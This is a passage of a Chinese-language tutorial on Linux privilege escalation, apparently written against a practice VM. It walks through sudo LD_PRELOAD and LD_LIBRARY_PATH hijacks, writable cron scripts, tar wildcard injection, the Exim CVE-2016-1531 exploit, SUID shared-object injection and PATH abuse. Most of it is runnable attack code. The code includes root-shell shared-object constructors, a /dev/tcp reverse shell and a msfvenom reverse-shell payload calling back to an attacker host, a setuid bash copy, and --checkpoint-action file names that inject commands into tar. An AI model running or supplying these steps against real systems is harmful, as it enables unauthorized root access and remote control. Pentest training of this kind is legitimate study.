+<span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643180.png" alt="image-20210704103218382"></p>
+<h5 id="3-编译preload-c到preload-so："><a href="#3-编译preload-c到preload-so：" class="headerlink" title="3.编译preload.c到preload.so："></a>3.编译preload.c到preload.so：</h5><pre class="line-numbers language-none"><code class="language-none">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h5 id="4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径："><a href="#4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径：" class="headerlink" title="4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径："></a>4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径：</h5><pre class="line-numbers language-none"><code class="language-none">sudo LD_PRELOAD=/tmp/preload.so apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643181.png" alt="image-20210704103256577"></p>
+<h4 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h4><h4 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h4><p>LD_LIBRARY_PATH环境变量包含一组目录，首先搜索共享库。<br>ldd 命令可用于打印程序使用的共享库：</p>
+<pre class="line-numbers language-none"><code class="language-none">ldd /usr/sbin/apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>通过创建与程序使用的同名共享库，并将LD_LIBRARY_PATH设置为其父目录，程序将转而加载我们的共享库。</p>
+<h4 id="实操-7"><a href="#实操-7" class="headerlink" title="实操"></a>实操</h4><h5 id="1-运行ldd对apache2程序文件："><a href="#1-运行ldd对apache2程序文件：" class="headerlink" title="1.运行ldd对apache2程序文件："></a>1.运行ldd对apache2程序文件：</h5><pre class="line-numbers language-none"><code class="language-none">ldd /usr/sbin/apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643182.png" alt="image-20210704103440965"></p>
+<p>这个方法是进行劫持共享对象是命中或未命中的，从中选择一个列表并尝试它</p>
+<h5 id="2-创建具有以下内容的文件-library-path-c-："><a href="#2-创建具有以下内容的文件-library-path-c-：" class="headerlink" title="2.创建具有以下内容的文件(library_path.c)："></a>2.创建具有以下内容的文件(library_path.c)：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hijack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">hijack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_LIBRARY_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643183.png" alt="image-20210704103702129"></p>
+<h5 id="3-将library-path-c-编译成libcrypt-so-1"><a href="#3-将library-path-c-编译成libcrypt-so-1" class="headerlink" title="3.将library_path.c 编译成libcrypt.so.1:"></a>3.将library_path.c 编译成libcrypt.so.1:</h5><pre class="line-numbers language-none"><code class="language-none">gcc -o libcrypt.so.1 -shared -fPIC library_path.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h5 id="4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）："><a href="#4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）：" class="headerlink" title="4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）："></a>4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）：</h5><pre class="line-numbers language-none"><code class="language-none">sudo LD_LIBRARY_PATH=. apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643184.png" alt="image-20210704103723147"></p>
+<h1 id="0x08-Cron-jobs"><a href="#0x08-Cron-jobs" class="headerlink" title="0x08 Cron jobs"></a>0x08 Cron jobs</h1><h2 id="前言-10"><a href="#前言-10" class="headerlink" title="前言"></a>前言</h2><p>Cron jobs是用户可以安排在特定时间或间隔运行的程序或脚本。<br>Cron jobs与拥有它们的用户的安全级别一起运行。<br>默认情况下，使用环境变量有限的<code>/bin/sh</code> shell</p>
+<h2 id="Cron-tables"><a href="#Cron-tables" class="headerlink" title="Cron tables"></a>Cron tables</h2><p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于<code>/var/spool/cron/</code> or <code>/var/spool/cron/crontabs/</code><br>system系统的crontab位于<code>/etc/crontab</code></p>
+<h2 id="文件权限-1"><a href="#文件权限-1" class="headerlink" title="文件权限"></a>文件权限</h2><p>与 Cron jobs关联的文件权限配置错误可能导致提权<br>如果我们可以编写到作为 cron jobs的一部分运行的程序或脚本，我们可以用我们自己的代码替换它。</p>
+<h2 id="实操-8"><a href="#实操-8" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看system-wide-crontab的内容："><a href="#1-查看system-wide-crontab的内容：" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3><pre class="line-numbers language-cat" data-language="cat"><div class="caption"><span>/etc/crontab</span></div><code class="language-cat">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643185.png" alt="image-20210630171256823"></p>
+<h3 id="2-在服务器上查找overwrite-sh-文件："><a href="#2-在服务器上查找overwrite-sh-文件：" class="headerlink" title="2.在服务器上查找overwrite.sh 文件："></a>2.在服务器上查找overwrite.sh 文件：</h3><pre class="line-numbers language-none"><code class="language-none">locate overwrite.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643186.png" alt="image-20210630171347594"></p>
+<pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-检查文件的权限"><a href="#3-检查文件的权限" class="headerlink" title="3.检查文件的权限"></a>3.检查文件的权限</h3><pre class="line-numbers language-none"><code class="language-none">ls -l /usr/local/bin/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643187.png" alt="image-20210630171515478"></p>
+<p>注意：这个文件是可写的</p>
+<h3 id="4-将-overwrite-sh文件的内容替换为："><a href="#4-将-overwrite-sh文件的内容替换为：" class="headerlink" title="4.将 overwrite.sh文件的内容替换为："></a>4.将 overwrite.sh文件的内容替换为：</h3><pre class="line-numbers language-none"><code class="language-none">#!/bin/bash 
+bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643188.png" alt="image-20210630171650623"></p>
+<h3 id="5-kali上运行nc"><a href="#5-kali上运行nc" class="headerlink" title="5.kali上运行nc"></a>5.kali上运行nc</h3><p>等待 cron jobs运行，返回root权限</p>
+<h2 id="路径环境变量"><a href="#路径环境变量" class="headerlink" title="路径环境变量"></a>路径环境变量</h2><p>默认情况下，crontab环境变量设置为：<code>/usr/bin:/bin</code><br>路径变量可以覆盖在crontab文件中。<br>如果 cron jobs程序/脚本不使用绝对路径，并且其中一个 PATH 目录可由我们的用户编写，我们也许能够创建与 cron jobs同名的程序/脚本。</p>
+<h2 id="实操-9"><a href="#实操-9" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看system-wide-crontab的内容：-1"><a href="#1-查看system-wide-crontab的内容：-1" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643189.png" alt="image-20210630173619529"></p>
+<p>请注意，/home/user目录（我们可以写信给）位于 PATH 变量的开头，并且第一个 cron jobs不使用绝对路径。</p>
+<h3 id="2-在-home-user-中创建文件-overwrite-sh，内容如下："><a href="#2-在-home-user-中创建文件-overwrite-sh，内容如下：" class="headerlink" title="2.在/home/user 中创建文件 overwrite.sh，内容如下："></a>2.在/home/user 中创建文件 overwrite.sh，内容如下：</h3><pre class="line-numbers language-none"><code class="language-none">#!/bin/bash 
+cp /bin/bash /tmp/rootbash 
+chmod +s /tmp/rootbash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643190.png" alt="image-20210630173757396"></p>
+<h3 id="3-加权"><a href="#3-加权" class="headerlink" title="3.加权"></a>3.加权</h3><pre class="line-numbers language-none"><code class="language-none">$ chmod +x /home/user/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4-等待cronjob运行（此作业尤其每分钟运行一次）。"><a href="#4-等待cronjob运行（此作业尤其每分钟运行一次）。" class="headerlink" title="4.等待cronjob运行（此作业尤其每分钟运行一次）。"></a>4.等待cronjob运行（此作业尤其每分钟运行一次）。</h3><h3 id="5-创建-tmp-rootbash文件"><a href="#5-创建-tmp-rootbash文件" class="headerlink" title="5.创建/tmp/rootbash文件"></a>5.创建/tmp/rootbash文件</h3><p>执行它，使用与-p保存有效的UID</p>
+<pre class="line-numbers language-none"><code class="language-none">/tmp/rootbash –p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643191.png" alt="image-20210630174309759"></p>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><h3 id="前言-11"><a href="#前言-11" class="headerlink" title="前言"></a>前言</h3><p>当通配符字符 <code>* </code>作为参数的一部分提供给命令时，外壳将首先在通配符上执行 文件名扩展 （也称为 globbing）</p>
+<p>此过程将用以空格分隔的文件列表替换通配符，以及当前目录中的目录名</p>
+<p>执行命令：</p>
+<pre class="line-numbers language-echo" data-language="echo"><div class="caption"><span>*</span></div><code class="language-echo">echo *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="通配符-amp-文件名"><a href="#通配符-amp-文件名" class="headerlink" title="通配符 &amp; 文件名"></a>通配符 &amp; 文件名</h3><p>由于Linux 中的文件系统通常对文件名非常允许，并且文件名扩展在执行命令之前发生，因此可以通过创建具有这些名称的文件将命令行选项（例如 -h，-help）传递到命令</p>
+<p>文件名不仅限于简单的选项<br>事实上，我们可以创建匹配复杂选项的文件名：</p>
+<pre class="line-numbers language-none"><code class="language-none">--option=key=value <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
+<p>可以帮助确定命令是否有有命令行选项</p>
+<h3 id="实操-10"><a href="#实操-10" class="headerlink" title="实操"></a>实操</h3><h4 id="1-查看system-wide-crontab内容"><a href="#1-查看system-wide-crontab内容" class="headerlink" title="1.查看system-wide crontab内容:"></a>1.查看system-wide crontab内容:</h4><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643192.png" alt="image-20210704104709412"></p>
+<pre class="line-numbers language-none"><code class="language-none">root /usr/local/bin/compress.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="2-查看文件的内容："><a href="#2-查看文件的内容：" class="headerlink" title="2.查看文件的内容："></a>2.查看文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /usr/local/bin/compress.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643193.png" alt="image-20210704104806120"></p>
+<p>注意：tar命令在 <code>/home/user</code>中使用通配符<code>*</code>运行</p>
+<h4 id="3-查阅参考"><a href="#3-查阅参考" class="headerlink" title="3.查阅参考"></a>3.查阅参考</h4><p>显示tar具有命令行选项，可以用来运行其他命令作为检查点功能的一部分</p>
+<h4 id="4-使用msfvenom创建反向壳ELF有效载荷："><a href="#4-使用msfvenom创建反向壳ELF有效载荷：" class="headerlink" title="4.使用msfvenom创建反向壳ELF有效载荷："></a>4.使用msfvenom创建反向壳ELF有效载荷：</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.175.161 LPORT=4444 -f elf -o shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643194.png" alt="image-20210704110051360"></p>
+<h4 id="5-搞文件到tar所在运行目录，并加权："><a href="#5-搞文件到tar所在运行目录，并加权：" class="headerlink" title="5.搞文件到tar所在运行目录，并加权："></a>5.搞文件到tar所在运行目录，并加权：</h4><p>python开启HTTP服务 </p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643195.png" alt="image-20210704110127651"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643196.png" alt="image-20210704110119309"></p>
+<pre class="line-numbers language-none"><code class="language-none">chmod +x /home/user/shell.elf	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643197.png" alt="image-20210704110200778"></p>
+<h4 id="6-在-home-user目录中创建两个文件："><a href="#6-在-home-user目录中创建两个文件：" class="headerlink" title="6.在/home/user目录中创建两个文件："></a>6.在/home/user目录中创建两个文件：</h4><pre class="line-numbers language-none"><code class="language-none">touch /home/user/--checkpoint=1 
+
+touch /home/user/--checkpoint-action=exec=shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643198.png" alt="image-20210704110307745"></p>
+<h4 id="7-kali运行nc等待cron-job"><a href="#7-kali运行nc等待cron-job" class="headerlink" title="7.kali运行nc等待cron job"></a>7.kali运行nc等待cron job</h4><h1 id="0x09-SUID-SGID可执行文件"><a href="#0x09-SUID-SGID可执行文件" class="headerlink" title="0x09 SUID / SGID可执行文件"></a>0x09 SUID / SGID可执行文件</h1><h2 id="前言-12"><a href="#前言-12" class="headerlink" title="前言"></a>前言</h2><p>SUID文件使用文件所有者的权限执行。<br>SGID文件使用文件组的权限执行。<br>如果文件归root所有，则使用root特权执行，我们也许能够使用它来升级权限。</p>
+<h2 id="SUID-SGID文件"><a href="#SUID-SGID文件" class="headerlink" title="SUID / SGID文件"></a>SUID / SGID文件</h2><p>我们可以使用以下<code>find</code>命令查找带有SUID 或 SGID 位集的文件</p>
+<pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643199.png" alt="image-20210630180510655"></p>
+<h2 id="外壳逃生序列-1"><a href="#外壳逃生序列-1" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>正如我们能够使用壳逃生序列与程序运行通过sudo，我们可以做同样的SUID/SGID文件。<br>此处可以找到带有外壳逃生序列的程序列表 ：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>注意：默认情况下， 环境变量LD_PRELOAD &amp; LD_LIBRARY_PATH<br>这是在Linux禁用，因为它带来的明显安全风险！<br><strong>执行 SUID 文件时，这两个环境变量都会被忽略</strong></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>某些程序安装 SUID 文件以帮助其操作。<br>正如作为root运行的服务可能有漏洞，我们可以利用root外壳，这些SUID文件也可以。<br>使用Searchsploit, Google, and GitHub可以找到漏洞</p>
+<h2 id="实操-11"><a href="#实操-11" class="headerlink" title="实操"></a>实操</h2><h3 id="1-在目标上查找SUID-SGID-文件-："><a href="#1-在目标上查找SUID-SGID-文件-：" class="headerlink" title="1.在目标上查找SUID/SGID 文件 ："></a>1.在目标上查找SUID/SGID 文件 ：</h3><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643200.png" alt="image-20210630180804891"></p>
+<pre class="line-numbers language-none"><code class="language-none">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Exim 是一个邮件转账代理，但是它存在许多安全漏洞</p>
+<h3 id="2-版本确认："><a href="#2-版本确认：" class="headerlink" title="2.版本确认："></a>2.版本确认：</h3><pre class="line-numbers language-none"><code class="language-none">/usr/sbin/exim-4.84-3 --version <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643201.png" alt="image-20210630181009415"></p>
+<h3 id="3-漏洞寻找"><a href="#3-漏洞寻找" class="headerlink" title="3.漏洞寻找"></a>3.漏洞寻找</h3><pre class="line-numbers language-none"><code class="language-none">searchsploit exim 4.84 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643202.png" alt="image-20210630181114318"></p>
+<p>这个：<code>linux/local/39535.sh</code></p>
+<h3 id="4-漏洞利用-CVE-2016-1531"><a href="#4-漏洞利用-CVE-2016-1531" class="headerlink" title="4.漏洞利用(CVE-2016-1531)"></a>4.漏洞利用(CVE-2016-1531)</h3><p>脚本复制到目标机器上。您可能需要从脚本中删除^M字符：</p>
+<pre class="line-numbers language-none"><code class="language-none">sed -e "s/^M//" 39535.sh &gt; a001.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注意：要获得^M，必须按住Ctrl，然后连续按V和M。</p>
+<h3 id="5-加权"><a href="#5-加权" class="headerlink" title="5.加权"></a>5.加权</h3><pre class="line-numbers language-none"><code class="language-none">chmod +x a001.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643203.png" alt="image-20210704110724989"></p>
+<h3 id="6-执行脚本以获得根壳："><a href="#6-执行脚本以获得根壳：" class="headerlink" title="6.执行脚本以获得根壳："></a>6.执行脚本以获得根壳：</h3><pre class="line-numbers language-none"><code class="language-none">./a001.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643204.png" alt="image-20210704110700833"></p>
+<h2 id="共享对象注入"><a href="#共享对象注入" class="headerlink" title="共享对象注入"></a>共享对象注入</h2><h3 id="前言-13"><a href="#前言-13" class="headerlink" title="前言"></a>前言</h3><p>执行程序时，它将尝试加载所需的共享对象。<br>通过使用称为strace 的程序，我们可以跟踪这些系统呼叫并确定是否未找到任何共享对象。<br>如果我们可以写信给程序尝试 打开的位置，我们可以创建一个共享对象，并在加载时生成root</p>
+<h3 id="实操-12"><a href="#实操-12" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID文件-："><a href="#1-在目标上查找SUID-SGID文件-：" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643205.png" alt="image-20210701115900118"></p>
+<pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>suid-so</code>文件在root用户权限下执行</p>
+<h4 id="2-在SUID文件上运行分层："><a href="#2-在SUID文件上运行分层：" class="headerlink" title="2.在SUID文件上运行分层："></a>2.在SUID文件上运行分层：</h4><pre class="line-numbers language-none"><code class="language-none">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such  file"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643206.png" alt="image-20210704111607655"></p>
+<pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such  file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+user@debian:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>可以看到找不到共享对象 <code>libcalc.so</code>，程序正在查看用户的家庭目录，我们可以写东西给这个目录</p>
+<h4 id="3-创建-home-user-config目录"><a href="#3-创建-home-user-config目录" class="headerlink" title="3.创建 /home/user/.config目录"></a>3.创建 /home/user/.config目录</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643207.png" alt="image-20210704112350458"></p>
+<p>注意：这里查看的话 要查看隐藏文件夹命令</p>
+<h4 id="4-创建libcalc-c具有-以下-内容："><a href="#4-创建libcalc-c具有-以下-内容：" class="headerlink" title="4.创建libcalc.c具有 以下 内容："></a>4.创建<code>libcalc.c</code>具有 以下 内容：</h4><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void inject() __attribute__((constructor));
+void inject() {
+setuid(0);
+system("/bin/bash -p");
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="5-进行编译"><a href="#5-进行编译" class="headerlink" title="5.进行编译"></a>5.进行编译</h4><pre class="line-numbers language-none"><code class="language-none">gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643208.png" alt="image-20210704112538615"></p>
+<h4 id="6-运行可执行的SUID以获得根壳："><a href="#6-运行可执行的SUID以获得根壳：" class="headerlink" title="6.运行可执行的SUID以获得根壳："></a>6.运行可执行的SUID以获得根壳：</h4><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/suid-so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643209.png" alt="image-20210704112616418"></p>
+<h2 id="路径环境变量-1"><a href="#路径环境变量-1" class="headerlink" title="路径环境变量"></a>路径环境变量</h2><h3 id="前言-14"><a href="#前言-14" class="headerlink" title="前言"></a>前言</h3><p>PATH 环境变量包含外壳应尝试查找程序的目录列表。<br>如果程序尝试执行其他程序，但只指定程序名称，而不是其完整（绝对）路径，则外壳将搜索 PATH 目录，直到找到为止。<br>由于用户完全控制其 PATH 变量，我们可以告诉外壳首先在目录中查找我们可以写到的程序。</p>
+<h3 id="查找易受攻击的程序"><a href="#查找易受攻击的程序" class="headerlink" title="查找易受攻击的程序"></a>查找易受攻击的程序</h3><p>如果程序尝试执行其他程序，该程序的名称可能嵌入到可执行文件中，作为string。<br>我们可以在可执行文件上运行strings以查找strings。<br>我们还可以使用策略(strace)来查看程序的执行情况。另一个称为”Itrace”的程序也可能有用。</p>
+<h4 id="对文件运行字符串："><a href="#对文件运行字符串：" class="headerlink" title="对文件运行字符串："></a>对文件运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">strings /path/to/file	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="针对命令运行策略："><a href="#针对命令运行策略：" class="headerlink" title="针对命令运行策略："></a>针对命令运行策略：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve &lt;command&gt; 2&gt;&amp;1 | grep exec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="对命令运行-跟踪-："><a href="#对命令运行-跟踪-：" class="headerlink" title="对命令运行 跟踪 ："></a>对命令运行 跟踪 ：</h4><pre class="line-numbers language-none"><code class="language-none">ltrace &lt;command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="实操-13"><a href="#实操-13" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID文件-：-1"><a href="#1-在目标上查找SUID-SGID文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643210.png" alt="image-20210701171659145"></p>
+<pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>suid-env</code>文件在root用户权限下执行</p>
+<h5 id="2-在SUID文件上运行stings："><a href="#2-在SUID文件上运行stings：" class="headerlink" title="2.在SUID文件上运行stings："></a>2.在SUID文件上运行stings：</h5><pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/suid-env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643211.png" alt="image-20210701173258438"></p>
+<p>该文件可能正在尝试在没有完整路径的情况下运行服务程序。</p>
